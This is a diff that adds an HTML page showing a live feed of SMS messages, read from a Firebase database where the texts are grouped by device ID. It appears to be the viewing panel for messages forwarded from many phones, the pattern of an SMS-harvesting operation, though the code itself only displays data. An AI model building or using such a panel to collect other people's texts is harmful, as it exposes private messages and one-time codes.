@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All SMS - Live Feed</title>
+
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+
+        .title {
+            font-size: 1rem;
+        }
+
+        .back-btn {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 0.9rem;
+            padding: 6px 14px;
+            border: 1px solid #334155;
+            border-radius: 8px;
+        }
+
+        .back-btn:hover {
+            border-color: #10b981;
+            color: #10b981;
+        }
+
+        .sms-card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            animation: fadeIn 0.2s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .meta {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: #10b981;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .time {
+            color: #94a3b8;
+            font-weight: normal;
+            white-space: nowrap;
+        }
+
+        .msg {
+            margin: 0;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-size: 0.95rem;
+        }
+
+        .info {
+            font-size: 0.75rem;
+            color: #64748b;
+            margin-top: 8px;
+            border-top: 1px dashed #334155;
+            padding-top: 5px;
+            word-break: break-word;
+        }
+
+        .device-id {
+            font-size: 0.7rem;
+            color: #94a3b8;
+            background: #0f172a;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+
+        .loading {
+            color: #94a3b8;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #334155;
+            border-top: 2px solid #10b981;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-badge {
+            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: #1e293b;
+            color: #94a3b8;
+            border: 1px solid #334155;
+            white-space: nowrap;
+        }
+
+        .status-badge.live {
+            color: #10b981;
+            border-color: #10b981;
+        }
+
+        .error {
+            color: #ef4444;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+<div class="container">
+
+    <div class="header">
+        <div>
+            <a href="index.html" class="back-btn">← Back</a>
+            <span class="title" style="margin-left: 12px;">📨 All SMS</span>
+        </div>
+
+        <span id="counter" class="status-badge">Loading...</span>
+    </div>
+
+    <div id="sms-container">
+        <div class="loading">
+            <span class="spinner"></span>
+            Loading recent messages...
+        </div>
+    </div>
+
+</div>
+
+<script type="module">
+
+    import { initializeApp } from
+        "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+
+    import {
+        getDatabase,
+        ref,
+        onValue
+    } from
+        "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+
+    /*
+     * ==========================================================
+     * FIREBASE
+     * ==========================================================
+     *
+     * New database structure:
+     *
+     * All_Users
+     *   └── DEVICE_ID
+     *        └── FIREBASE_PUSH_ID
+     *             ├── body
+     *             ├── id
+     *             ├── sender
+     *             ├── receivedDate
+     *             ├── timestamp
+     *             └── timestampMillis
+     *
+     * ==========================================================
+     */
+
+    const app = initializeApp({
+        databaseURL:
+            "https://yes2-ead3d-default-rtdb.firebaseio.com"
+    });
+
+    const db = getDatabase(app);
+
+    const container = document.getElementById("sms-container");
+    const counter = document.getElementById("counter");
+
+
+    /*
+     * ==========================================================
+     * GLOBAL SMS LISTENER
+     * ==========================================================
+     *
+     * We listen to All_Users because messages are grouped by
+     * device rather than stored in one common/smsData node.
+     *
+     * Each device's child key becomes deviceId.
+     * Each SMS's child key becomes firebasePushId.
+     *
+     * The feed is then flattened and sorted globally.
+     * ==========================================================
+     */
+
+    const allUsersRef = ref(db, "All_Users");
+
+    onValue(
+        allUsersRef,
+        (snapshot) => {
+
+            if (!snapshot.exists()) {
+                container.innerHTML =
+                    '<div class="error">📭 No messages found</div>';
+
+                counter.textContent = "0 messages";
+                counter.classList.remove("live");
+                return;
+            }
+
+            const messages = [];
+
+            snapshot.forEach((deviceSnapshot) => {
+
+                const deviceId = deviceSnapshot.key;
+                const deviceMessages = deviceSnapshot.val();
+
+                if (!deviceMessages ||
+                    typeof deviceMessages !== "object") {
+                    return;
+                }
+
+                Object.entries(deviceMessages).forEach(
+                    ([pushId, sms]) => {
+
+                        if (!sms ||
+                            typeof sms !== "object") {
+                            return;
+                        }
+
+                        messages.push({
+                            pushId: pushId,
+                            deviceId: deviceId,
+
+                            body: sms.body || "",
+                            sender: sms.sender || "Unknown",
+                            numberId: sms.id ?? "",
+                            receivedDate: sms.receivedDate || "",
+                            timestamp: sms.timestamp || "",
+                            timestampMillis:
+                                Number(sms.timestampMillis) || 0
+                        });
+                    }
+                );
+            });
+
+
+            /*
+             * Newest first.
+             * timestampMillis is preferred because it is numeric.
+             */
+            messages.sort((a, b) => {
+
+                const timeA =
+                    a.timestampMillis ||
+                    Date.parse(a.receivedDate) ||
+                    Date.parse(a.timestamp) ||
+                    0;
+
+                const timeB =
+                    b.timestampMillis ||
+                    Date.parse(b.receivedDate) ||
+                    Date.parse(b.timestamp) ||
+                    0;
+
+                return timeB - timeA;
+            });
+
+
+            /*
+             * Same behaviour as the previous website:
+             * display only the latest 50 globally.
+             */
+            const recentMessages = messages.slice(0, 50);
+
+            counter.textContent =
+                `${recentMessages.length} recent messages`;
+
+            counter.classList.add("live");
+
+            container.innerHTML = "";
+
+            const fragment =
+                document.createDocumentFragment();
+
+            recentMessages.forEach((sms) => {
+
+                const card =
+                    document.createElement("div");
+
+                card.className = "sms-card";
+
+
+                // Meta
+                const meta =
+                    document.createElement("div");
+
+                meta.className = "meta";
+
+
+                const senderElement =
+                    document.createElement("span");
+
+                senderElement.textContent =
+                    `📨 ${sms.sender}`;
+
+
+                const timeElement =
+                    document.createElement("span");
+
+                timeElement.className = "time";
+
+                timeElement.textContent =
+                    `🕐 ${
+                        sms.receivedDate ||
+                        sms.timestamp ||
+                        "N/A"
+                    }`;
+
+
+                meta.appendChild(senderElement);
+                meta.appendChild(timeElement);
+
+
+                // Message
+                const messageElement =
+                    document.createElement("p");
+
+                messageElement.className = "msg";
+
+                messageElement.textContent =
+                    sms.body;
+
+
+                card.appendChild(meta);
+                card.appendChild(messageElement);
+
+
+                // Information
+                const info =
+                    document.createElement("div");
+
+                info.className = "info";
+
+                info.textContent =
+                    `📱 Device: ${sms.deviceId}  •  Number ID: ${sms.numberId}`;
+
+                card.appendChild(info);
+
+
+                // Firebase push ID
+                const pushInfo =
+                    document.createElement("div");
+
+                pushInfo.className = "info";
+
+                pushInfo.textContent =
+                    `🔑 Push ID: ${sms.pushId}`;
+
+                card.appendChild(pushInfo);
+
+
+                fragment.appendChild(card);
+            });
+
+
+            container.appendChild(fragment);
+        },
+
+        (error) => {
+
+            console.error("Firebase Error:", error);
+
+            container.innerHTML =
+                `<div class="error">
+                    ❌ ${error.message}
+                 </div>`;
+
+            counter.textContent = "Error";
+            counter.classList.remove("live");
+        }
+    );
+
+</script>
+
+</body>
+</html>
